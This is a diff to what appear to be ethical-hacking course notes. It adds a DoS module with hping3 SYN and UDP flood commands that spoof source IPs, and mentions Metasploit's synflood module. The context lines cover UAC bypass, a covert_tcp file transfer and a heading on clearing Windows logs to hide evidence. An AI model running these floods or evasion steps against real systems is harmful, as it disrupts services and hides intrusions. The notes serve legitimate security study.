@@ -248,7 +248,7 @@ https://null-byte.wonderhowto.com/how-to/bypass-uac-escalate-privileges-windows-
 >- if getsystem didn't worked use`bypassuac` or `bypassuac_fodhelper` exploit module
 >- set payload to what you have defined in msfvenom payload
 >- Now u will have the root user privileges
-[Ultimate List of Meterpreter Commands](simplenote://note/39167abb-f1fe-4be1-a80b-fff229eabb8c)
+[Ultimate List of Meterpreter Commands]
 
 `To get all information regarding privilege escalation use WinPEAS/LinPEAS`
 
@@ -361,7 +361,7 @@ Download covert_tcp file
 	`./covert_tcp -dest 192.168.1.100 -source 192.168.1.108 -source_port 9999 -dest_port 8888 -file [file_send.txt]`
 
 ---Clear Logs to Hide Evidence---
-[CLEARING LOGS - Windows](simplenote://note/676ec02f-ed17-4ea0-8c7e-4c58d8b77c86)
+[CLEARING LOGS - Windows]
 
 
 <<<Module 08- Sniffing>>>
@@ -418,5 +418,15 @@ on a http website (plaintext)
 
 ---To Detect a sniffer which is in promiscous mode in our LAN network we can use NMAP nse script named `sniffer-detect`
 ---
+
+<<<Module 10: Dos/DDOS>>>
+
+---Hping3---
+
+- `sudo hping3 -S [Target Ip] -a [Spoofed IP] -p [any open port] --flood`
+- `sudo hping3 -d 65538 -S [Target Ip] -a [Spoofed IP] -p [any open port] --flood`
+- `sudo hping3 --udp [Target Ip] -a [Spoofed IP] -p [any open port] --flood`
+- For more info , refer this [ Hping3]
+- We can also use msf module named `synflood` to perform dos attack and spoofing IP address.
 
 #Stay tuned for more
